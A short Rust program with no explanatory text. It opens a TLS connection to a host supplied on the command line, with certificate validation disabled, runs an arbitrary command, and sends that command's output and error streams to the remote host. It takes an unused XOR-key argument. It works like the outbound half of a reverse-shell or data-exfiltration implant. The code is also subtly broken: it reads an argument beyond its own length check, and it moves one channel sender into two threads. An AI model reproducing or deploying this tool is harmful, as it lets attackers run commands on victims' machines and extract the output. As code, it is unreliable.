use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use native_tls::TlsConnector;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} <host> <port> <command> <arguments> <xorkey>", args[0]);
        std::process::exit(1);
    }

    let host = &args[1];
    let port = &args[2];
    let command = &args[3];
    let arguments = &args[4];
    let xorkey: u8 = args[5].parse().expect("Invalid XOR key");

    let addr = format!("{}:{}", host, port);
    let stream = TcpStream::connect(&addr).expect("Failed to connect to the server");
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let mut stream = connector.connect(host, stream).unwrap();

    let (tx, rx) = mpsc::channel();

    let mut child = Command::new(command)
        .args(arguments.split_whitespace())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to execute command");

    let stdout = child.stdout.take().unwrap();
    let stdout_thread = thread::spawn(move || {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            let line = line.unwrap();
            tx.send(line).unwrap();
        }
    });

    let stderr = child.stderr.take().unwrap();
    let stderr_thread = thread::spawn(move || {
        let reader = BufReader::new(stderr);
        for line in reader.lines() {
            let line = line.unwrap();
            tx.send(line).unwrap();
        }
    });

    loop {
        match rx.try_recv() {
            Ok(line) => {
                writeln!(stream, "{}", line).unwrap();
                stream.flush().unwrap();
            }
            Err(mpsc::TryRecvError::Disconnected) => break,
            Err(mpsc::TryRecvError::Empty) => {}
        }
    }

    stdout_thread.join().unwrap();
    stderr_thread.join().unwrap();
}
